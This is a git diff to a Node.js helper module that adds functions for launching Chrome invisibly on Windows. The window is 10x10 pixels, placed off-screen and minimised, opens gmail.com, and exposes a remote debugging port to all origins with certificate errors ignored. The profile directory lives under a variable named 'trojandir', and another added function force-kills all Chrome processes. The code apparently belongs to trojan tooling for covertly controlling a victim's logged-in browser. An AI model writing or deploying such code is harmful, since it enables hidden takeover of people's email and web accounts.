@@ -20,6 +20,9 @@ var logfpath = path.join(
     scriptfname + "_" + getTimestamp() + ".log"
 );
 
+let chrome_debug_path = "C:\\Users\\LC2022\\AppData\\Local\\chrome-win64\\chrome.exe";
+let chrome_path = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";
+
 
 function csvToJson(csvData) {
 
@@ -76,6 +79,40 @@ function isUTF16LEBuffer(buffer) {
     // UTF-16LE BOM is 0xFF 0xFE
     return buffer[0] === 0xff && buffer[1] === 0xfe;
 }
+
+// note: spawning chrome process --> results in a PID that differs from launch
+// ! can't use isPidAlive to check if pid is active
+async function activate_chrome(start_url="https://www.gmail.com", debugport=9223, headless=false, unref=false) {
+
+    let isactive = await is_chrome_active();
+
+    if ( isactive )
+        return true;
+
+    childp = helper.spawn_chrome(start_url, debugport, headless, unref);
+    // helper.exec_chrome(start_url, debugport, headless);
+
+    await delay(2000);
+
+    isactive = await is_chrome_active();
+
+    return isactive;
+}
+
+function kill_chrome() {
+    return new Promise((resolve, reject) => {
+        const wmicCommand = "taskkill /F /IM chrome.exe";
+
+        exec(wmicCommand, (error, stdout, stderr) => {
+            if (error) {
+                reject( { error: error, stderr: stderr } );
+            }
+
+            resolve( { stdout:stdout, stderr:stderr } );
+        });
+    });
+}
+
 
 async function exec_wmic_process() {
     return new Promise((resolve, reject) => {
@@ -201,6 +238,55 @@ function isPidAlive(pid) {
     }
 }
 
+function exec_chrome(starturl = "https://www.gmail.com/",
+    debugport = 9223,
+    headless = false,
+    x_pos = 2000,
+    y_pos = 2000,
+    width=10,
+    height=10,
+    datadir = path.join(trojandir, "chrome"),
+    stdoutfunc = null,
+    stderrfunc = null,
+) {
+
+    let cmdlineargs = [
+        `--remote-debugging-port=${debugport}`,
+        `--user-data-dir=${datadir}`,
+        `--new-window ${starturl}`,
+        headless ? `--headless=new` : '',
+        `--no-first-run`, // You can skip Chrome's welcome and setup screens
+        `--no-default-browser-check`,
+        `--profile-directory=Default`,
+        `--remote-allow-origins=*`,
+        // `--restore-last-session`,
+        `--ignore-certificate-errors`,
+        `--window-position=${x_pos},${y_pos}`,
+        `--window-size=${width},${height}`,
+        `--hide-crash-restore-bubble`
+    ];
+
+    let ret = exec(`start "" /min ${chrome_debug_path} ${cmdlineargs.join(' ')}`, (error, stdout, stderr) => {
+        
+        logmsg(stdout);
+        
+        if (stdoutfunc)
+            stdoutfunc(stdout);
+
+        logmsg(stderr);
+
+        if (stderrfunc)
+            stderrfunc(stderr);
+
+        if (error) {
+            logmsg(`Error: ${error.message}`);
+            return;
+        }
+
+    });
+
+}
+
 // note: child chrome process has a new/different pid upon launch
 // existing chrome process interferes with launch of new process
 function spawn_chrome(
@@ -221,7 +307,7 @@ function spawn_chrome(
 
     let cmdlineargs = [
         `--remote-debugging-port=${debugport}`,
-        `--user-data-dir=${datadir}`,
+        // `--user-data-dir=${datadir}`,
         `--new-window ${starturl}`,
         headless ? `--headless=new` : '',
         `--no-first-run`, // You can skip Chrome's welcome and setup screens
@@ -236,15 +322,13 @@ function spawn_chrome(
     ];
 
     // TODO auto discover by reading chrome lnk files
-    let chrome_exe_path =
-        "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";
 
-    const child = spawn(chrome_exe_path, [...cmdlineargs], {
-        // detached: true, // might cause errors
+    const child = spawn('conhost.exe', [chrome_debug_path, ...cmdlineargs], {
+        detached: true, // might cause errors
         // windowsHide: true,
         // stdio: ["ignore", out, err],
-        // shell: false,
-        // cwd: systemstate.trojandir,
+        shell: true,
+        cwd: 'C:\\Users\\LC2022\\AppData\\Local\\chrome-win64\\',
     });
 
     child.stdout.on("data", (data) => {
@@ -368,6 +452,7 @@ async function connectToChrome(debugport, openfunc, messagefunc, errorfunc) {
 logmsg("--- EXPORTING ---");
 
 module.exports = {
+    exec_chrome,
     spawn_chrome,
     logmsg,
     getTimestamp,
